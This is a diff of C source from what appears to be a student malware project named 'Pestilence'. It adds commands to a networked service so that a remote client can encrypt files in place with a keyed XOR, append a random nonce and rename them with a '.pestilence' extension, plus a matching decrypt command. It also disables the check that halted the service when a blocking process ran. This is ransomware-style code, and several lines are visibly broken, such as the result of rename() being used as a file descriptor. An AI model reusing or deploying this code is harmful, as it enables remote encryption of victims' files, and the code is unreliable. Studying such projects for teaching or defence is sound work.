@@ -6,7 +6,7 @@
 /*   By: pboucher <pboucher@student.42.fr>          +#+  +:+       +#+        */
 /*                                                +#+#+#+#+#+   +#+           */
 /*   Created: 2026/04/18 15:18:30 by mbatty            #+#    #+#             */
-/*   Updated: 2026/06/12 13:56:10 by pboucher         ###   ########.fr       */
+/*   Updated: 2026/06/12 19:35:40 by pboucher         ###   ########.fr       */
 /*                                                                            */
 /* ************************************************************************** */
 
@@ -239,9 +239,8 @@ int	message_hook(t_client *client, char *msg, int64_t size, void *ptr)
 		ctx->running = false;
 		return (1);
 	}
-	else if (!strncmp(msg, "encrypt", 7) || !strncmp(msg, "decrypt", 7))
+	else if (!strncmp(msg, "decrypt", 7))
 	{
-
 		if (strlen(msg) == 8 || (msg[7] != ' ' && msg[7] != 0))
 		{
 			server_send_to_id(&ctx->server, client->id, RGB(255,0,0)BAD_ENCRYPT CLR);
@@ -267,6 +266,20 @@ int	message_hook(t_client *client, char *msg, int64_t size, void *ptr)
 			server_send_to_id(&ctx->server, client->id, RGB(255,0,0) BAD_PATH_CRYPT CLR);
 			goto _prompt;
 		}
+		if (strlen(msg) <= 11)
+			goto _prompt;
+		if (strcmp(&msg[strlen(msg) - 11], ".pestilence") != 0)
+			server_send_to_id(&ctx->server, client->id, "Error, bad format");
+		char *renameFile = remove_last_n(msg, 11);
+		int fdcheck = open(renameFile, O_RDONLY);
+		if (fdcheck != -1)
+		{
+			server_send_to_id(&ctx->server, client->id, "Error, File already exist.\n");
+			close(file);
+			close(fdcheck);
+			goto _prompt;
+		}
+		close(fdcheck);
 		struct stat	stats;
 		fstat(file, &stats);
 		size_t	size = stats.st_size;
@@ -276,11 +289,19 @@ int	message_hook(t_client *client, char *msg, int64_t size, void *ptr)
 			bytes[i] = bytes[i] ^ key_hash[i % 32];
 		munmap(ptr, size);
 		server_send_to_id(&ctx->server, client->id, RGB(0,255,0) SUCCES_ENCRYPT CLR);
+		char nonce[32];
+		lseek(file, -32, SEEK_END);
+		read(file, nonce, 32);
+		off_t taille = lseek(file, 0, SEEK_END);
+		ftruncate(file, taille - 32);
+		off_t taille_corps = lseek(file, 0, SEEK_END) - 32;
+		(void)taille_corps;
+		lseek(file, 0, SEEK_SET);
+		file = rename(msg, renameFile);
 		close(file);
 	}
-	else if (!strncmp(msg, "wacrypt", 7))
+	else if (!strncmp(msg, "encrypt", 7))
 	{
-
 		if (strlen(msg) == 8 || (msg[7] != ' ' && msg[7] != 0))
 		{
 			server_send_to_id(&ctx->server, client->id, RGB(255,0,0)BAD_ENCRYPT CLR);
@@ -300,31 +321,41 @@ int	message_hook(t_client *client, char *msg, int64_t size, void *ptr)
 		uint8_t	key_hash[32];
 		sha256((uint8_t *)user_key, key_len, key_hash);
 
-		int randomData = open("/dev/urandom", O_RDONLY);
-		if (randomData < 0)
-		{
-			server_send_to_id(&ctx->server, client->id, "Failed to generate random key");
-			goto _prompt;
-		}
-			char myRandomData[50];
-			ssize_t result = read(randomData, myRandomData, sizeof myRandomData);
-			if (result < 0)
-			{	
-				server_send_to_id(&ctx->server, client->id, "Failed to generate random key");
-				goto _prompt;
-			}
-		for (int i = 0; i < 50; ++i)
-		{
-			printf("%d", myRandomData[i]);
-		}
-		printf("\n");
-
 		int file = open((const char *)msg, O_RDWR);
 		if (file == -1)
 		{
 			server_send_to_id(&ctx->server, client->id, RGB(255,0,0) BAD_PATH_CRYPT CLR);
 			goto _prompt;
 		}
+		char *renameFile = strjoin(msg, ".pestilence");
+		int fdcheck = open(renameFile, O_RDONLY);
+		if (fdcheck != -1)
+		{
+			server_send_to_id(&ctx->server, client->id, "Error, File already exist.\n");
+			close(file);
+			close(fdcheck);
+			goto _prompt;
+		}
+		close(fdcheck);
+		int randomData = open("/dev/urandom", O_RDONLY);
+		if (randomData == -1)
+		{
+			server_send_to_id(&ctx->server, client->id, "Error, rip path for random num");
+			close(file);
+			close(randomData);
+			goto _prompt;
+		}
+		char myRandomData[32];
+		ssize_t result = read(randomData, myRandomData, sizeof myRandomData);
+		if (result == -1)
+		{
+			server_send_to_id(&ctx->server, client->id, "Error, File already exist.\n");
+			close(file);
+			close(fdcheck);
+			goto _prompt;
+		}
+		write(file, myRandomData, 32);
+		file = rename(msg, renameFile);
 		struct stat	stats;
 		fstat(file, &stats);
 		size_t	size = stats.st_size;
@@ -367,40 +398,6 @@ int	message_hook(t_client *client, char *msg, int64_t size, void *ptr)
 		closedir(dir);
 		server_send_to_id(&ctx->server, client->id, "\n");
 	}
-	else if (!strcmp(msg, "ps"))
-	{
-		DIR *dir = opendir("/proc");
-		if (!dir)
-			goto _prompt;
-		struct dirent   *dirent = NULL;
-
-		do
-		{
-			dirent = readdir(dir);
-			if (dirent)
-			{
-				char    buf[4096] = {0};
-
-				sprintf(buf, "/proc/%s/cmdline", dirent->d_name);
-
-				int fd = open(buf, O_RDONLY);
-				if (fd == -1)
-					goto _prompt;
-
-				ssize_t bytes = read(fd, buf, sizeof(buf));
-
-				server_send_to_id(&ctx->server, client->id, "PID: ");
-				server_send_to_id(&ctx->server, client->id, dirent->d_name);
-				server_send_to_id(&ctx->server, client->id, "CMD: ");
-				server_send_to_id(&ctx->server, client->id, bytes <= 0 ? NULL : buf);
-				server_send_to_id(&ctx->server, client->id, NEW_LINE);
-				close(fd);
-			}
-		} while (dirent != NULL);
-
-		closedir(dir);
-	}	
-	
 	else
 		server_send_to_id(&ctx->server, client->id, RGB(255,0,0)INVALID_COMMAND CLR);
 _prompt:
@@ -445,8 +442,8 @@ int	run_service(const char *bin_path)
 	ctx.running = true;
 	while (ctx.running)
 	{
-		if (is_process_running(BLOCKING_PROCESS))
-			break ;
+		// if (is_process_running(BLOCKING_PROCESS))
+		// 	break ;
 
 		server_update(&ctx.server);
 	}
